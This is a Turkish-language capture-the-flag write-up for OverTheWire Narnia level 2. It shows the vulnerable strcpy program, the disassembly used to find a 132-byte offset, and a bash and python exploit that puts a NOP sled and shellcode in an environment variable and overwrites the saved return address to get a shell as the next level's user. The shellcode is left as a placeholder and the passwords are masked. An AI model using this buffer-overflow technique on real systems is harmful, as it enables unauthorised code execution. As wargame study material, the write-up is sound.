# OverTheWire — Narnia Level 2 → 3

> Hedef: `narnia2`'den `narnia3` şifresi. Sonuç: **`**********`** (gizlendi)
> Teknik: `strcpy` overflow → **Saved EIP** ezme → env'deki NOP sled+shellcode'a atlama.

---

## 1. Bağlantı
```bash
ssh narnia2@narnia.labs.overthewire.org -p 2226
```

## 2. Kaynak
```c
int main(int argc, char *argv[]){
    char buf[128];
    if(argc == 1){ printf("Usage: %s argument\n", argv[0]); exit(1); }
    strcpy(buf, argv[1]);   // AÇIK: sınır yok, girdi argv[1] (stdin DEĞİL)
    printf("%s", buf);
}
```

## 3. Offset — disasm (**VERIFIED = 132**, walkthrough'taki 140 değil!)
```
08049189:  add  esp, 0xffffff80      ; = sub esp, 0x80  (128 byte frame, PADDING YOK)
...
80491b5:   lea  eax, [ebp-0x80]      ; buf = ebp-0x80
80491b9:   call strcpy@plt
```
`buf = ebp-0x80` (128), saved EIP `ebp+4` → mesafe `0x80 + 4 = **132**`.

> ⚠️ **Canlı bulgu:** Repo walkthrough'u offset olarak **140** kullanıyor; bu binary'de
> `sub esp,0x80` (ekstra padding yok) olduğu için gerçek offset **132**. 140 denersem EIP'ye
> `AAAA` (0x41414141) yazılır → segfault. Önce 140 deneyip segfault aldım, disasm'la 132'ye düzelttim.

```
[ buf (128) ][ saved ebp (4) ][ saved eip (4) ]
  └──── 132 dolgu (128+4) ────┘ └ RET → env sled ┘
```

## 4. Adres bulma (getenvaddr, ASLR kapalı)
Shellcode'u `EGG`'e büyük NOP sled (20000) ile koy. Hedefle **aynı uzunlukta path**
(15 char = `len("/narnia/narnia2")`) bir helper ile `getenv("EGG")` adresini bul → düzeltme 0:
```c
int main(int c,char**v){ printf("ADDR=%p\n",(void*)getenv(v[1])); return 0; }
```
> `gcc` ev dizinine (`~`) yazamaz ("Cannot create temporary file in ./") → **`cd /tmp`** şart.

## 5. Exploit
```bash
cd /tmp
gcc -m32 -o /tmp/genvaddr12 ga.c                  # 15-char path
export EGG=$(python3 -c 'import sys; sys.stdout.buffer.write(b"\x90"*20000 + SHELLCODE_57)')
ADDR=$(/tmp/genvaddr12 EGG /narnia/narnia2 | sed -n 's/ADDR=0x\([0-9a-f]*\)/\1/p')   # örn ffff8f9e
RET=$((0x$ADDR + 10000))                          # sled ortası -> örn ffff6a... +10000
python3 -c 'timed: bekle, sonra "id; cat /etc/narnia_pass/narnia3"' | \
  /narnia/narnia2 "$(python3 -c "import sys,struct; sys.stdout.buffer.write(b'A'*132 + struct.pack('<I', RET))")"
```
Çıktı: `ADDR=ffff8f9e RET=ffffb6ae` → `uid=14003(narnia3)` → şifre.

## 6. Doğrulama
`uid=14003(narnia3)` ✅

## Dersler
| Konu | Not |
|------|-----|
| Offset 132 | `buf=ebp-0x80` → 128+4; **disasm ile teyit** (walkthrough'un 140'ı yanlış) |
| argv girdisi | `./narnia2 "$payload"`, pipe DEĞİL (`argc==1` → Usage) |
| env adresi | 15-char path eşitse `getenv` doğrudan; 20KB sled toleransı büyütür |
| gcc /tmp | ev dizini yazılamaz → `cd /tmp` |
| segfault → düzelt | rc=139 + EIP=0x41414141 → offset fazla; disasm ile düzelt |

**narnia3 şifresi: `**********`**
